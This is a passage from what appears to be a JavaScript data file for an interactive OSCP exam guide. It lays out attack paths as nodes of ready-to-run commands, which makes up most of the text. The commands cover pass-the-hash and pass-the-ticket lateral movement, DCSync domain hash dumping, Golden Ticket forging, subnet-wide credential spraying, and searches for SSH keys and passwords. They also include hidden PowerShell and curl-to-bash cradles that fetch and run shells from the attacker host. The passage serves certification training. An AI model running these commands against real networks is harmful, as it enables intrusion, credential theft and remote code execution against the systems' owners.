# ── EVIL-WINRM — WinRM (port 5985/5986) ──
# Best shell for Windows — tab completion, file upload/download
evil-winrm -i $TARGET -u $USER -p '$PASS'
evil-winrm -i $TARGET -u $USER -H $NTLM_HASH     # pass-the-hash
evil-winrm -i $TARGET -u $USER -p '$PASS' -S      # HTTPS (5986)

# Upload/download inside evil-winrm:
# upload /path/to/local/tool.exe C:\Windows\Temp\tool.exe
# download C:\Windows\Temp\output.txt /local/path/

# ── IMPACKET-PSEXEC — SMB (port 445) ──────
# Gives SYSTEM shell. Requires admin rights + write to ADMIN$
# Creates a service — detectable, noisier
impacket-psexec $DOMAIN/$USER:'$PASS'@$TARGET
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH

# ── IMPACKET-WMIEXEC — WMI (port 135/445) ─
# Stealthier — no service created, output via SMB share
# Semi-interactive shell
impacket-wmiexec $DOMAIN/$USER:'$PASS'@$TARGET
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH

# ── IMPACKET-SMBEXEC — SMB ────────────────
# No binary written — uses cmd.exe via service
impacket-smbexec $DOMAIN/$USER:'$PASS'@$TARGET
impacket-smbexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH

# ── PASS-THE-TICKET — Kerberos ────────────
# Use a Kerberos ticket (.ccache) instead of creds/hash
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass $DOMAIN/$USER@dc01.$DOMAIN
impacket-wmiexec -k -no-pass $DOMAIN/$USER@$TARGET

# Generate ticket from hash (overpass-the-hash):
impacket-getTGT $DOMAIN/$USER -hashes :$NTLM_HASH -dc-ip $DC_IP
export KRB5CCNAME=$USER.ccache

# ── CRACKMAPEXEC — SPRAY ALL MACHINES ─────
# Find where creds work across the whole domain
crackmapexec smb $SUBNET/24 -u $USER -p '$PASS' --continue-on-success
crackmapexec smb $SUBNET/24 -u $USER -H $NTLM_HASH --continue-on-success
# (Pwn3d!) machines = you have local admin → shell via psexec/wmiexec

# Run commands across all (Pwn3d!) machines:
crackmapexec smb $SUBNET/24 -u $USER -H $NTLM_HASH -x "whoami"

# ── XFREERDP — RDP (if needed) ────────────
xfreerdp /u:$USER /p:'$PASS' /v:$TARGET /cert-ignore +clipboard
xfreerdp /u:$USER /pth:$NTLM_HASH /v:$TARGET /cert-ignore    # PtH (restricted admin mode)

# ── POWERSHELL REMOTING ────────────────────
# From a Windows foothold:
$cred = Get-Credential    # or build manually
Enter-PSSession -ComputerName $TARGET -Credential $DOMAIN\$USER
Invoke-Command -ComputerName $TARGET -ScriptBlock {whoami} -Credential $DOMAIN\$USER`,
    warn: "WinRM (5985) is open on most AD machines by default — always try evil-winrm first. psexec requires the ADMIN$ share to be accessible — if it fails with 'STATUS_ACCESS_DENIED' but CME shows (Pwn3d!), try wmiexec instead. Pass-the-hash via RDP requires restricted admin mode enabled on the target — not always available. Always spray CME across the full subnet after getting new creds — (Pwn3d!) on multiple machines means lateral movement options.",
    choices: [
      { label: "Reached DC — run DCSync", next: "dcsync" },
      { label: "On member server — privesc to SYSTEM", next: "windows_post_exploit" },
      { label: "Spray found more machines — enumerate", next: "windows_post_exploit" },
      { label: "Need tickets — Kerberoast/AS-REP first", next: "kerberoast" },
    ],
  },

  dcsync: {
    phase: "AD",
    title: "DCSync — Dump the Domain",
    body: "DCSync simulates a Domain Controller replication request — any account with Replicating Directory Changes + Replicating Directory Changes All rights can pull password hashes for any account without touching LSASS. This is game over: you get every user's NTLM hash, crack offline or pass-the-hash directly to any machine in the domain. Prefer impacket-secretsdump from Kali — it needs no agent on the DC and leaves less forensic trace than mimikatz.",
    cmd: `# ── FROM KALI — impacket-secretsdump ────
# (preferred — no agent, no AV risk, works remotely)

# With cleartext creds:
impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP

# With NTLM hash (pass-the-hash):
impacket-secretsdump $DOMAIN/$USER@$DC_IP -hashes :NTLM_HASH

# Just NTLM hashes (fastest, no Kerberos tickets):
impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-ntlm

# Dump only specific account (quieter):
impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-user administrator

# Output format — read the results:
# Administrator:500:LM_HASH:NTLM_HASH:::
# username:RID:LM:NTLM:::
# The NTLM field (after the second colon) is what you use

# ── FROM WINDOWS — mimikatz ───────────────
# (requires DA or DCSync rights + debug privilege)
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /user:administrator" "exit"

# Dump all accounts:
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /all /csv" "exit"

# ── USE THE HASHES ────────────────────────
# Immediate goals after DCSync:
# 1. Get DA shell on DC
evil-winrm -i $DC_IP -u administrator -H NTLM_HASH
impacket-psexec $DOMAIN/administrator@$DC_IP -hashes :NTLM_HASH

# 2. Lateral movement to all machines (Pwn3d! = local admin)
crackmapexec smb $SUBNET/24 -u administrator -H NTLM_HASH

# 3. Crack offline for cleartext (useful for persistence + report)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Golden Ticket (persistence — survives password change)
# Need: krbtgt NTLM hash, domain SID
impacket-lookupsid $DOMAIN/$USER:'$PASS'@$DC_IP | grep "Domain SID"
impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-XXXX -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass $DOMAIN/administrator@dc01.$DOMAIN

# ── GRAB THE PROOF ────────────────────────
evil-winrm -i $DC_IP -u administrator -H NTLM_HASH
# Once in:
whoami && hostname && ipconfig
type C:\Users\Administrator\Desktop\proof.txt`,
    warn: "impacket-secretsdump output includes machine account hashes (ending in $) — ignore these for cracking, focus on user accounts. The krbtgt hash enables Golden Ticket attacks for long-term persistence — always grab it even if you don't use it immediately. If secretsdump fails with 'STATUS_USER_SESSION_DELETED', the DC rejected the replication request — verify your account actually has DCSync rights (BloodHound → Find Principals with DCSync Rights).",
    choices: [
      { label: "Got DA shell — grab proof.txt", next: "ad_complete" },
      { label: "Hash cracking — cleartext for report", next: "hashcrack" },
      { label: "Lateral movement across domain", next: "lateral_movement" },
    ],
  },

  ad_complete: {
    phase: "AD",
    title: "Domain Admin — AD Set Complete",
    body: "40 points locked in. Screenshot each machine in the chain: initial workstation, pivot machine, DC. All three need proof.txt + whoami + hostname + IP.",
    cmd: `# On Domain Controller
whoami
hostname
ipconfig
type C:\\Users\\Administrator\\Desktop\\proof.txt

# Screenshot checklist for full AD set:
# ✅ Machine 1: whoami + hostname + IP + local.txt
# ✅ Machine 2: whoami + hostname + IP + local.txt
# ✅ DC: whoami (DA) + hostname + IP + proof.txt
# ✅ Full attack chain documented in report`,
    warn: null,
    choices: [
      { label: "Now hit the standalone machines", next: "start" },
    ],
  },

  // ══════════════════════════════════════════
  //  MINDSET — THE INNER PATH
  // ══════════════════════════════════════════

  mindset_preexam: {
    phase: "MINDSET",
    title: "Pre-Exam — Before the Clock Starts",
    body: "The exam begins before you click Start. Environment failure at hour 3 is not bad luck — it is skipped preparation. Do this now, while the mind is calm.",
    cmd: `# ── ENVIRONMENT ─────────────────────────
# VPN connected and stable
sudo openvpn ~/oscp.ovpn &
ping 10.10.10.1   # confirm routing

# Kali updated, tools present
which nmap gobuster feroxbuster ligolo-ng evil-winrm impacket-secretsdump

# Wordlists in place
ls /usr/share/wordlists/rockyou.txt
ls /usr/share/seclists/Discovery/Web-Content/

# Results folder template ready
mkdir -p ~/exam/{machine1,machine2,machine3,ad}/{scans,exploits,loot,screenshots,tunnels}

# ── TIME PLAN ────────────────────────────
# 23h 45m total. Suggested blocks:
# Hour  0-2:  Recon ALL machines in parallel. Do not exploit yet.
# Hour  2-6:  Attack highest-confidence target first.
# Hour  6-10: Second machine. AD set — push this if recon is clear.
# Hour 10-14: Third machine. Revisit stalled machines fresh.
# Hour 14-18: Fill gaps. Partial flags count.
# Hour 18-22: Documentation. Stop hacking at hour 22.
# Hour 22-24: Report finalization and submission.

# ── MENTAL CONTRACT ──────────────────────
# You will get stuck. That is part of the exam.
# Stuck is not failing. Stuck is information.
# When stuck: document what you know, rotate machine, return fresh.`,
    warn: "Enumerate ALL machines before deep-diving any single one. Parallel recon in the first 2 hours is the highest-leverage action of the entire exam.",
    choices: [
      { label: "Clock is running — start recon", next: "start" },
      { label: "I am already stuck mid-exam", next: "mindset_stuck" },
    ],
  },

  mindset_stuck: {
    phase: "MINDSET",
    title: "Arjuna on Kurukshetra",
    body: "You are not failing. The mind has contracted. Arjuna froze before the greatest battle of his life — not from lack of skill, but from overwhelm. Krishna did not tell him to try harder. He told him to see clearly. Stop. Work through this checklist now. The answer is usually in what you have already seen.",
    cmd: `# ══ STOP. CLOSE EXTRA TERMINALS. ONE WINDOW. ══

# ── LAYER 1: ENUMERATION COMPLETENESS ────
# Most stalls are premature exploitation attempts.
# Honest answers only:

# Have you scanned ALL 65535 TCP ports?
nmap -p- --min-rate 5000 $ip -oN allports.txt
# (The intended path is often on a high port you missed)

# Have you done UDP?
sudo nmap -sU --top-ports 100 $ip -oN udp.txt
# SNMP (161), TFTP (69) — both expose credentials on OSCP boxes

# Have you done vhost enumeration?
# Many OSCP boxes hide the real app on a vhost, not the IP
# If you found ANY domain name — fuzz vhosts now

# Have you read robots.txt, sitemap.xml, /README, /changelog?
curl -s http://$ip/robots.txt
curl -s http://$ip/sitemap.xml

# Have you checked every service version against searchsploit?
searchsploit --nmap targeted.xml
# Not just the obvious ones — ALL of them, including the boring ones

# ── LAYER 2: READ WHAT YOU ALREADY HAVE ──
# Before running more tools — re-read existing output:

cat targeted.txt    # look at EVERY line, not just the ports you targeted
# What does the hostname in smb-os-discovery say?
# What banners did nmap grab on odd ports?
# What do the NSE script outputs say? http-title? http-auth?

# If there's a web app — re-read the page source:
curl -s http://$ip | less
# Look for: commented-out code, hidden form fields, version numbers,
# internal hostnames in URLs, debug endpoints, JavaScript includes

# If there's a login page:
# Have you tried EVERY default credential combination?
# Have you tried SQLi bypass manually (not just tools)?

# ── LAYER 3: CREDENTIAL AUDIT ─────────────
# Have you sprayed every credential found so far?
# Found a hash → PtH every service
# Found a password → spray every service (SSH, SMB, WinRM, RDP, FTP, web)
# Found a username → default passwords, username-as-password

# ── LAYER 4: VERSION CHASE ────────────────
# Go back to every version number nmap returned
# Cross-reference NVD, not just searchsploit:
# https://nvd.nist.gov/vuln/search?query=<service>+<version>
# Try one minor version up and one down — banners can be wrong

# ── LAYER 5: THE HONEST QUESTION ─────────
# Write this down:
# "The evidence I have that my current attack vector is valid is: ___"
# If you can not complete that sentence with concrete evidence —
# you are in a rabbit hole. Exit now.

# ── THE ROTATION DECISION ─────────────────
# > 90 minutes with no forward movement = rotate to another machine
# Mark this box: "PAUSED — [what you tried, what happened]"
# Set it down completely. Minimum 45 minutes on another target.
# This is not defeat. It is triage.`,
    warn: "The checklist items in order of payoff: (1) missed ports / UDP — catches the box immediately if there is a high-port service you skipped; (2) vhost enumeration — the most-missed technique on OSCP boxes; (3) re-reading existing nmap output — the answer is often already there; (4) credential spray — one cred sprayed everywhere is worth hours of new enumeration. Work through these in order before concluding the surface is locked.",
    choices: [
      { label: "Missed ports — going back to full scan", next: "full_portscan" },
      { label: "Missed vhosts — fuzzing now", next: "vhost_enum" },
      { label: "Missed credentials — spraying now", next: "cred_reuse" },
      { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
      { label: "I need to triage my time and score", next: "mindset_triage" },
      { label: "Fresh start — back to engagement start", next: "start" },
    ],
  },

  mindset_rabbithole: {
    phase: "MINDSET",
    title: "The Rabbit Hole",
    body: "A rabbit hole feels like progress because you are moving. But movement without position change is just spinning. The signs are specific. Check them now.",
    cmd: `# ── RABBIT HOLE DIAGNOSTIC ──────────────
# Answer honestly:

# 1. HOW LONG on this single vector?
#    > 45 minutes without forward movement = rabbit hole

# 2. WHAT IS YOUR EVIDENCE this vector is valid?
#    Gut feeling is not evidence.
#    A version number + confirmed CVE is evidence.
#    A confirmed parameter + confirmed reflection is evidence.

# 3. HAVE YOU GOOGLED THE EXACT ERROR MESSAGE?
#    Not the general technique — the exact error you are seeing.

# 4. HAVE YOU READ THE ACTUAL RESPONSE?
#    View page source. Read response headers.
#    What is the app actually telling you?

# ── THE EXIT PROTOCOL ────────────────────
# Document where you are — exact URL, payload, response.
# Write: Paused — potential vector, needs revisit
# Set it down completely.

# Rotate to a different machine NOW.
# Do not think about this machine for 45 minutes.
# When you return you will see it differently.
# This is not metaphor — it is how the brain processes problems offline.

# ── COMMON FALSE RABBIT HOLES ────────────
# "There must be a SQLi here" — have you tried other params?
# "This LFI should work" — tried /proc/self/environ, php://filter?
# "The exploit should work" — exact version match confirmed?
# "I just need to tweak the payload" — after 10 tweaks, vector is wrong`,
    warn: "Sunk cost is the enemy of the path. The time already spent is gone. The only question is: what is the best use of the time remaining?",
    choices: [
      { label: "Rotating — go back to start for another machine", next: "start" },
      { label: "I need to triage where to spend remaining time", next: "mindset_triage" },
      { label: "I have a real lead — back to targeted scan", next: "targeted_scan" },
    ],
  },


  // ══════════════════════════════════════════
  //  FILE TRANSFER
  // ══════════════════════════════════════════

  file_transfer: {
    phase: "SHELL",
    title: "File Transfer — Get Tools on Target",
    body: "Getting tools onto a target is a skill. Know at least 3 methods per OS — one will always be blocked. Start your HTTP server first, then choose delivery method based on what's available.",
    cmd: `# ── ATTACKER: START FILE SERVER ──────────
python3 -m http.server 80
python3 -m http.server 443   # if 80 blocked
# Or SMB share (Windows targets love this):
impacket-smbserver share . -smb2support
impacket-smbserver share /path/to/tools -smb2support -username user -password pass

# ── LINUX: DOWNLOAD TO TARGET ─────────────
wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
curl http://$LHOST/shell.elf | bash   # fileless

# nc transfer (no HTTP available)
# Attacker: nc -nlvp 4444 < file.sh
# Target:   nc $LHOST 4444 > /tmp/file.sh

# base64 transfer (no network tools)
# Attacker: base64 -w0 linpeas.sh
# Target:   echo "BASE64" | base64 -d > /tmp/lp.sh

# SCP (if SSH available)
scp linpeas.sh user@$ip:/tmp/lp.sh

# ── WINDOWS: DOWNLOAD TO TARGET ──────────
# certutil (built-in, often allowed)
certutil -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe

# PowerShell DownloadFile
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Windows\Temp\shell.exe')"

# PowerShell DownloadString (fileless — runs in memory)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"

# bitsadmin (older Windows)
bitsadmin /transfer job http://$LHOST/shell.exe C:\Windows\Temp\shell.exe

# SMB copy (no HTTP needed — use impacket-smbserver)
copy \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
# Or in PowerShell:
Copy-Item \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe

# curl (Windows 10+)
curl http://$LHOST/shell.exe -o C:\Windows\Temp\shell.exe

# ── WINDOWS: EXECUTE IN MEMORY ────────────
# PS DownloadString — never touches disk
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')"

# Encoded download cradle
$CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
echo $CMD | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc [OUTPUT]

# ── VERIFY TRANSFER ───────────────────────
# Linux
md5sum /tmp/file.sh
# Windows
certutil -hashfile C:\Windows\Temp\shell.exe MD5`,
    warn: "impacket-smbserver is the most reliable Windows transfer when HTTP is blocked. Modern Windows requires SMB2 — always add -smb2support. If Defender blocks the download, use the in-memory DownloadString cradle — it never writes to disk.",
    choices: [
      { label: "Tools transferred — Linux privesc", next: "linpeas" },
      { label: "Tools transferred — Windows privesc", next: "winpeas" },
      { label: "Transfer blocked — troubleshoot shell", next: "shell_troubleshoot" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  // ══════════════════════════════════════════
  //  CREDENTIAL REUSE
  // ══════════════════════════════════════════

  cred_reuse: {
    phase: "CREDS",
    title: "Credential Reuse — Spray Everything",
    body: "Password reuse is the most consistent win on OSCP. The moment you find any credential, spray it across every service before doing anything else. Takes 60 seconds and pays off constantly.",
    cmd: `# ── SET YOUR CREDS ───────────────────────
export USER=founduser
export PASS='foundpassword'
export HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'

# ── CRACKMAPEXEC — SPRAY ALL SERVICES ────
# SMB
crackmapexec smb $ip -u $USER -p $PASS
crackmapexec smb $ip -u $USER -H $HASH   # PtH

# WinRM
crackmapexec winrm $ip -u $USER -p $PASS

# SSH
crackmapexec ssh $ip -u $USER -p $PASS

# RDP
crackmapexec rdp $ip -u $USER -p $PASS

# FTP
crackmapexec ftp $ip -u $USER -p $PASS

# MSSQL
crackmapexec mssql $ip -u $USER -p $PASS

# Spray across subnet (OSCP internal network)
crackmapexec smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
crackmapexec winrm $SUBNET/24 -u $USER -p $PASS

# ── READ CME OUTPUT ───────────────────────
# [+] = valid creds
# (Pwn3d!) = local admin — instant shell
# Use evil-winrm or psexec if Pwn3d

# ── CONNECT WITH VALID CREDS ─────────────
# WinRM (most common)
evil-winrm -i $ip -u $USER -p $PASS
evil-winrm -i $ip -u $USER -H $HASH

# SSH
ssh $USER@$ip

# SMB shell (psexec — needs admin share)
impacket-psexec $USER:$PASS@$ip
impacket-psexec -hashes $HASH $USER@$ip

# RDP
xfreerdp /u:$USER /p:$PASS /v:$ip /cert-ignore

# ── USERNAME VARIATIONS ───────────────────
# If exact user fails, try variations:
# admin, administrator, Administrator
# domain\\user, user@domain.com
# First.Last, firstlast, flast`,
    warn: "Pwn3d! in CME output means local admin. Stop and get that shell immediately — it is the highest-value finding in the output. (Pwn3d!) beats any further enumeration.",
    choices: [
      { label: "CME shows Pwn3d — get shell", next: "windows_post_exploit" },
      { label: "SSH access confirmed", next: "linux_post_exploit" },
      { label: "WinRM access — evil-winrm", next: "winrm_access" },
      { label: "Valid creds, no admin — keep enumerating", next: "targeted_scan" },
      { label: "Nothing worked — hash cracking", next: "hashcrack" },
    ],
  },

  // ══════════════════════════════════════════
  //  LINUX PASSWORD HUNTING
  // ══════════════════════════════════════════

  linux_password_hunt: {
    phase: "LINUX",
    title: "Linux Password Hunting",
    body: "Credentials live in config files, bash history, environment variables, and scripts. This is one of the most reliable Linux privesc paths and most people skip it. Search everything.",
    cmd: `# ── BASH HISTORY ─────────────────────────
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
# Look for: ssh commands, mysql -p, passwords in commands

# ── ENVIRONMENT VARIABLES ─────────────────
env | grep -i "pass\|key\|secret\|token\|api\|db"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# ── CONFIG FILES ──────────────────────────
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null |   xargs grep -li "password\|passwd\|secret" 2>/dev/null

find / -name "*.php" 2>/dev/null |   xargs grep -li "password\|db_pass\|mysql_pass" 2>/dev/null

# Common locations
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null    # WordPress DB creds
cat /etc/phpmyadmin/config-db.php 2>/dev/null
cat /var/www/html/configuration.php 2>/dev/null # Joomla
find /var/www -name "*.conf" -exec grep -i "pass" {} + 2>/dev/null

# ── DATABASE CREDENTIAL FILES ─────────────
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
cat /home/*/.my.cnf 2>/dev/null    # MySQL client creds
cat /root/.my.cnf 2>/dev/null

# ── SSH KEYS ─────────────────────────────
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
# Authorized keys — who can SSH in as this user?
cat /home/*/.ssh/authorized_keys 2>/dev/null

# ── SCRIPTS AND CRON ──────────────────────
find / -name "*.sh" 2>/dev/null | xargs grep -li "pass\|user\|cred" 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
find /var/spool/cron -type f 2>/dev/null | xargs cat 2>/dev/null

# ── RECENTLY MODIFIED FILES ───────────────
find / -mmin -10 -type f 2>/dev/null | grep -v proc
find / -mmin -60 -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | grep -v proc

# ── QUICK GREP ALL PASSWORDS ─────────────
grep -r "password" /var/www/ 2>/dev/null | grep -v "Binary\|\.swp"
grep -r "password" /opt/ 2>/dev/null | grep -v Binary
grep -rn "pass" /home/ 2>/dev/null | grep -v "Binary\|\.swp\|#"`,
    warn: "wp-config.php is the single most valuable file on a WordPress server — it contains database credentials that almost always reuse the system user password. Find it first.",
    choices: [
      { label: "Found credentials in config", next: "creds_found" },
      { label: "Found SSH key", next: "ssh_key" },
      { label: "Found DB creds — connect to DB", next: "mysql" },
      { label: "Nothing — back to automated enum", next: "linpeas" },
    ],
  },

  // ══════════════════════════════════════════
  //  CUSTOM WORDLISTS
  // ══════════════════════════════════════════

  custom_wordlist: {
    phase: "RECON",
    title: "Custom Wordlist Generation",
    body: "Rockyou fails when the password is application-specific or site-related. Generate custom wordlists from the target itself. CeWL scrapes the website. Username mutation covers credential stuffing. Crunch generates pattern-based lists.",
    cmd: `# ── CEWL — SCRAPE TARGET WEBSITE ─────────
# Generates wordlist from words found on the target site
cewl http://$ip -d 3 -m 5 -w /tmp/cewl_wordlist.txt
# -d 3 = crawl depth 3
# -m 5 = minimum word length 5

# With authentication
cewl http://$ip -d 3 -m 5   --auth_type basic --auth_user admin --auth_pass password   -w /tmp/cewl_auth.txt

# Include email addresses found
cewl http://$ip -d 2 -e -w /tmp/cewl_emails.txt

# ── USERNAME GENERATION ───────────────────
# From a name list (First Last format):
# Use username-anarchy or custom script
cat names.txt | while read line; do
  first=\$(echo \$line | cut -d' ' -f1 | tr '[:upper:]' '[:lower:]')
  last=\$(echo \$line | cut -d' ' -f2 | tr '[:upper:]' '[:lower:]')
  echo "\$first"
  echo "\$last"
  echo "\${first}.\${last}"
  echo "\${first}\${last}"
  echo "\${first:0:1}\${last}"
  echo "\${first:0:1}.\${last}"
done > /tmp/usernames.txt

# username-anarchy tool
username-anarchy -i names.txt > /tmp/usernames.txt

# ── CRUNCH — PATTERN-BASED ────────────────
# Syntax: crunch [min] [max] [charset] -t [pattern] -o [file]

# All 8-char lowercase
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o /tmp/8char.txt

# Pattern: Company + 4 digits (e.g. Corp1234)
crunch 8 8 -t Corp%%%% -o /tmp/corp_pass.txt

# Pattern: Month + Year (Jan2023)
crunch 7 7 -t @@@%%%%   -p Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec   -o /tmp/months.txt

# ── HASHCAT RULES ON WORDLIST ─────────────
# Mutate cewl output with rules
hashcat cewl_wordlist.txt -r /usr/share/hashcat/rules/best64.rule   --stdout > /tmp/mutated.txt

hashcat cewl_wordlist.txt   -r /usr/share/hashcat/rules/dive.rule   --stdout > /tmp/mutated_dive.txt

# ── LFI WORDLISTS ─────────────────────────
# Linux LFI
ls /usr/share/seclists/Fuzzing/LFI/
# Best: LFI-Jhaddix.txt (combined), LFI-gracefulsecurity-linux.txt

# Windows LFI — specific to Windows paths
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
# Contains: C:\Windows\win.ini, web.config, applicationHost.config, etc.

# Use with ffuf:
ffuf -u "http://$ip/page?file=FUZZ"   -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0 -mc 200

# ── WEB DIRECTORY WORDLISTS ───────────────
# Fast (CTF/exam): raft-medium-directories.txt
# Thorough: directory-list-2.3-medium.txt
# API endpoints: api/actions.txt, burp-parameter-names.txt
# Backup files: /usr/share/seclists/Discovery/Web-Content/raft-medium-extensions.txt

# ── COMBINE WORDLISTS ─────────────────────
cat rockyou.txt cewl_wordlist.txt | sort -u > /tmp/combined.txt`,
    warn: "CeWL on a company portal often produces the exact password format used internally — CompanyName + year or product names. Run it before rockyou on any corporate-looking application.",
    choices: [
      { label: "Wordlist ready — brute force login", next: "bruteforce" },
      { label: "Wordlist ready — LFI fuzzing", next: "lfi" },
      { label: "Wordlist ready — directory fuzzing", next: "web_fuzz_deep" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  // ══════════════════════════════════════════
  //  PORT KNOCKING
  // ══════════════════════════════════════════

  port_knocking: {
    phase: "RECON",
    title: "Port Knocking",
    body: "A firewall rule opens a port after receiving connections to a specific sequence of ports. Common on OSCP — usually hinted at in a config file or readme. The sequence is the key.",
    cmd: `# ── HOW TO DETECT ────────────────────────
# Hints that port knocking is in use:
# - /etc/knockd.conf readable (gives you the sequence)
# - README or note file mentions a sequence
# - nmap shows a port as filtered that should be open (SSH on filtered)
# - Searchsploit shows knockd on the target

# ── FIND THE SEQUENCE ─────────────────────
# If you have LFI or file read:
http://$ip/page?file=/etc/knockd.conf
# knockd.conf shows sequence like:
# sequence = 7000,8000,9000

# If you have a shell already:
cat /etc/knockd.conf
cat /etc/knockd.conf 2>/dev/null || find / -name knockd.conf 2>/dev/null

# ── EXECUTE THE KNOCK ─────────────────────
# Method 1: knock tool
knock $ip 7000 8000 9000
knock $ip 7000:udp 8000:tcp 9000:tcp   # if mix of UDP/TCP

# Method 2: nmap (no knock tool)
nmap -Pn --host-timeout 100 --max-retries 0 -p 7000 $ip
nmap -Pn --host-timeout 100 --max-retries 0 -p 8000 $ip
nmap -Pn --host-timeout 100 --max-retries 0 -p 9000 $ip

# Method 3: nc
nc -z $ip 7000
nc -z $ip 8000
nc -z $ip 9000

# ── VERIFY PORT OPENED ────────────────────
# After knock — check if target port is now open
nmap -Pn -p 22 $ip
# Should now show open instead of filtered

# ── TIMING ────────────────────────────────
# knockd has a timeout window (default 5 seconds between knocks)
# If sequence times out — repeat from beginning
# Some configs require specific intervals:
knock $ip 7000 && sleep 1 && knock $ip 8000 && sleep 1 && knock $ip 9000`,
    warn: "The sequence must be executed in exact order with no extra connections in between. If nmap scans between knocks — the sequence resets. Use the knock tool or careful nc, not nmap for the knock itself.",
    choices: [
      { label: "Port opened — SSH now accessible", next: "ssh_only" },
      { label: "Port opened — web service", next: "web_enum" },
      { label: "Still filtered — wrong sequence", next: "analyze_ambiguous" },
    ],
  },

  mindset_triage: {
    phase: "MINDSET",
    title: "Time Triage — Where to Spend What Remains",
    body: "At some point the exam becomes a resource allocation problem. You have time, machines, and partial progress. The path forward is not the most interesting machine — it is the highest expected value for the time remaining.",
    cmd: `# ── CURRENT STATE ASSESSMENT ────────────
# Fill this in right now:

# Standalone 1: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# Standalone 2: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# Standalone 3: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# AD machine 1: local.txt? [Y/N]                    = __/10pts
# AD machine 2: local.txt? [Y/N]                    = __/10pts
# AD DC:        proof.txt? [Y/N]                    = __/40pts
# Bonus points:                                      = __/10pts
# CURRENT TOTAL:                                     __/100pts
# NEED TO PASS:  70pts

# ── DECISION FRAMEWORK ───────────────────
# Score >= 70 pts:
#   STOP HACKING. Document everything. Submit. Do not risk it.

# Score 50-69 pts:
#   Where is the closest partial flag?
#   A local.txt on a machine you have a shell on = 10pts.
#   One privesc from proof.txt = highest priority target.

# Score 30-49 pts:
#   Have you done full recon on ALL machines?
#   Is there a machine you have not seriously attempted?
#   AD set: if you have machine 1, the rest chain — push the AD.

# Score < 30 pts with < 6 hours left:
#   Abandon lowest-confidence machine entirely.
#   Focus ALL remaining time on ONE machine you understand best.
#   Partial flags count — local.txt with no proof.txt = 10pts not 0.

# ── PASS PATHS ───────────────────────────
# 3 full standalones (60) + bonus (10)          = 70 pass
# 2 full standalones (40) + 3 local.txt (30)    = 70 pass
# AD set (40) + 1 full standalone (20) + bonus  = 70 pass
# AD set (40) + 2 standalones partial (30)       = 70 pass`,
    warn: "70 points passes. You do not need to own everything. A clear-eyed view of your score and the fastest path to 70 is worth more than 2 hours of unfocused hacking.",
    choices: [
      { label: "Back to hacking — I know where to focus", next: "start" },
      { label: "Stop and document what I have", next: "reporting" },
      { label: "Still stuck on a machine", next: "mindset_stuck" },
    ],
  },
};

// ─────────────────────────────────────────────
//  PHASE METADATA
// ─────────────────────────────────────────────
const PHASES = {
  ANALYSIS:  { color: "#34d399", icon: "◎" },
  JUMP:      { color: "#f0abfc", icon: "⟡" },
  RECON:     { color: "#3b9eff", icon: "◉" },
  DISCOVERY: { color: "#38bdf8", icon: "◎" },
  PIVOT:     { color: "#f472b6", icon: "⟳" },
  WEB:       { color: "#ff8c42", icon: "◈" },
  SMB:       { color: "#ff6b9d", icon: "◆" },
  FTP:       { color: "#ff6b9d", icon: "◆" },
  SSH:       { color: "#ff6b9d", icon: "◆" },
  CREDS:     { color: "#ffd166", icon: "◐" },
  SHELL:     { color: "#ffd166", icon: "◐" },
  LINUX:     { color: "#06d6a0", icon: "▲" },
  WINDOWS:   { color: "#ffbe0b", icon: "■" },
  AD:        { color: "#b5179e", icon: "◈" },
  REPORT:    { color: "#a0aec0", icon: "✎" },
  MINDSET:   { color: "#c084fc", icon: "◯" },
};

// ─────────────────────────────────────────────
//  COMPONENT
// ─────────────────────────────────────────────
